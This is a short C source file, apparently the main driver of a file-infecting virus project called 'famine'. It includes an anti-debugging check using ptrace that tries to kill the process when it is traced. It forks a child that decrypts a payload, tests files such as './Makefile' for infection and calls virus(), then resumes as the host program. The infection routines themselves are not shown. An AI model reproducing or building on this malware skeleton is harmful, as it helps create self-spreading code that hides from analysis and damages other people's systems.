//
// Created by Joris GOUNAND on 11/8/19.
//

#include "../inc/famine.h"

bool anti_debug_check(void)
{
	if (ptrace(PTRACE_TRACEME , 0, 0, 0) < 0)
	{
		kill(getpid(), -9);
		return (1);
	}
	return (0);
}

int main(void)
{
	pid_t pid;
	t_file file;

	if (anti_debug_check() && process_runing())
		exit(1);
	pid = fork();
	if (pid == 0) //children
	{
		decrypt(0,2,0,0,0);
		//write(1,"\n",1);
		printf("\nis it ? :%d ,%d \n", is_infected("./fafa", &file), is_infected("./Makefile", &file));
		virus();
		exit (0);
	}
	//jump to original
	return (0);
}